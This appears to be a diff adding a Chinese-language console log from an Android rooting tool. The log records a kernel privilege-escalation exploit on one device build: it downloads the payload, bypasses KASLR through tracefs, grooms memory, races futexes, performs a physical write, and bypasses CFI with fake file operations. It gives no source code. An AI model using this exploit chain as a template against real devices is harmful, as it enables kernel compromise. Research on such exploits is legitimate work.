@@ -1,0 +1,88 @@
+[*] 正在准备 Shizuku 执行
+[+] 已授予 Shizuku 权限
+[*] 正在检查 GitHub 支持清单
+[+] 支持配置: dm1q-S9110ZCS8FZI1
+[*] 正在下载 payload
+[*] 正在下载 exploit
+[*] exploit 已验证
+[*] 正在下载 KernelSU
+[*] KernelSU 已验证
+[+] payload 下载完成
+[*] 正在运行内核 exploit
+[+] preload supervisor pid=8099 attempts=24 base_delay=20000 p0_timeout=180 timeout=480
+[+] exploit attempt=1/24 pid=8107 delay=25000 p0_offset=scan
+[+] startup context pid=8107 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=8107 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=8107 label=dm1q-S9110ZCS8FZI1-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[+] p0 profile pid=8107 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001ddde6d bootid_data=ffffff8002c3a9c8 init_task=ffffff8002c850c0 root_tg=ffffff8002d39ac0 sysctl_bootid=ffffff8002eec0b1
+[*] slide source mode=auto
+[*] slide tracefs state tracing=0 event=0 id=108
+[*] slide tracefs trigger vforks=96 child_sleep_us=1000
+[*] slide tracefs trigger bytes=4194304
+[*] slide tracefs trigger result vfork=1 io=1
+[*] slide tracefs raw caller=ffffffc008110fe4 event=108 len=32
+[*] slide tracefs raw caller=ffffffc005e1252c event=108 len=32
+[*] slide tracefs raw caller=ffffffc0018555cc event=108 len=32
+[*] slide tracefs raw caller=ffffffc008155b44 event=108 len=32
+[*] slide tracefs raw caller=ffffffc008110fe4 event=108 len=32
+[*] slide tracefs raw caller=ffffffc008155b44 event=108 len=32
+[*] slide tracefs raw caller=ffffffc008110fe4 event=108 len=32
+[*] slide tracefs raw caller=ffffffc008110fe4 event=108 len=32
+[*] slide tracefs candidate=00048000 hits=343
+[*] slide tracefs raw summary pages=11 bytes=45056 events=570 callers=568 parse_fail=0 candidates=1 cpu_files=8
+[*] slide tracefs restore tracing=0 event=0 ok=1
+[+] slide tracefs caller gate candidate=00048000
+[+] slide-kaslr-ok source=tracefs pid=8107 base=ffffffc008048000 slide=0000000000048000 data_mode=canonical
+[*] controlled mm group search scans=256 objects=32 dma32_skip=8
+[*] controlled mm dma32 skip attempt=1 base=ffffff803dc28000 refs=256 total=256
+[-] only found 2 collisions -> cannot continue
+[*] controlled mm group opened attempt=3 group=0 base=ffffff8803a58000 hint=0
+[*] controlled mm group attempt=3 group=0 base=ffffff8803a58000 slot=12 count=1 hint=0
+[*] controlled mm group attempt=10 group=0 base=ffffff8803a58000 slot=21 count=8 hint=1
+[*] controlled mm group attempt=18 group=0 base=ffffff8803a58000 slot=23 count=16 hint=1
+[-] only found 0 collisions -> cannot continue
+[*] controlled mm group opened attempt=23 group=1 base=ffffff8862d18000 hint=0
+[*] controlled mm group attempt=23 group=1 base=ffffff8862d18000 slot=27 count=1 hint=0
+[-] only found 0 collisions -> cannot continue
+[*] controlled mm group attempt=30 group=1 base=ffffff8862d18000 slot=25 count=8 hint=0
+[-] only found 0 collisions -> cannot continue
+[*] controlled mm group attempt=38 group=1 base=ffffff8862d18000 slot=14 count=16 hint=1
+[-] only found 0 collisions -> cannot continue
+[*] controlled mm group attempt=46 group=1 base=ffffff8862d18000 slot=30 count=24 hint=1
+[*] controlled mm group attempt=53 group=1 base=ffffff8862d18000 slot=3 count=31 hint=1
+[*] controlled mm group attempt=54 group=1 base=ffffff8862d18000 slot=0 count=32 hint=1
+[*] controlled mm group full group=1 base=ffffff8862d18000 attempts=54 zone=normal
+[*] controlled mm group selected base=ffffff8862d18000 mode=0
+[*] controlled skb shape sent bytes=36480 cpu=0
+[*] controlled mm trigger ready pages=24 refs=768 s2=869 cpu=0
+[*] controlled mm target tail armed pages=24 refs_held=745 shape=ready cpu=0
+[*] controlled mm trigger release closed=745 cpu=0
+[*] controlled skb reclaim sends=8192 pairs=32 per_pair=256 stop_errno=0 base=ffffff8862d18000 mode=0
+[*] kernel page prepare mode=0 attempt=1/2 elapsed_ms=441813 base=ffffff8862d18000
+[*] durable log checkpoint stage=fops-page-held
+[-] durable log checkpoint skipped stage=fops-page-held mode=010600
+[*] p0 reference keeper pid=6774 pipe=0
+[*] app fops slide route parent=ffffff8862d19180 target=ffffffc00ac44f78 lock=ffffff8862d19390 configured_delay=50000 consume_delay=0 fine_ticks=0
+[+] slide child context stack_writer=mcast pid=6775 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[*] slide pi stage=owner-target-locked tid=6778
+[*] slide pi stage=owner-chain-lock-enter tid=6778
+[*] slide pi stage=cmp-enter waiter_tid=6776
+[*] slide pi stage=cmp-return ret=-1 errno=35 polls=1
+[*] slide pi stage=deadlock-accepted
+[*] slide wait_requeue_pi ret=-1 errno=110
+[*] slide pi stage=wait-timeout-accepted tid=6776
+[*] slide pi stage=waiter-unlock-enter tid=6776
+[*] slide pi stage=waiter-unlock-return tid=6776
+[*] slide pi stage=owner-chain-lock-return tid=6778
+[*] slide pi stage=writer-enter tid=6776
+[*] slide mcast returned domain=10 level=41 option=46 offset=0x78 ret=-1 errno=99 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[*] slide pi stage=writer-return tid=6776 sched_ok=1 window=1
+[*] p0 physical write status=0 ok=1
+[*] app fops stage=trigger-return attempt=1 triggered=1
+[*] cfi fake fops span=ffffff8862d19180-ffffff8862d19267 owner=0000000000000000 llseek=ffffffc00ac44f78 read=0000000000000000 write=0000000000000000
+[*] cfi scratch span=ffffff8862d1a180-ffffff8862d1a1a2 old=zero size=35
+[*] cfi write ret=35 errno=0
+[*] cfi llseek before=ffffffc00ac44f78 want=ffffffc008503d34 slot=ffffff8862d19188
+[*] cfi read ret=35 errno=0
+[*] cfi restoring misc_fops target=ffffffc00ac44f78 value=ffffffc00a0557f8
+[*] cfi starting pipe physrw
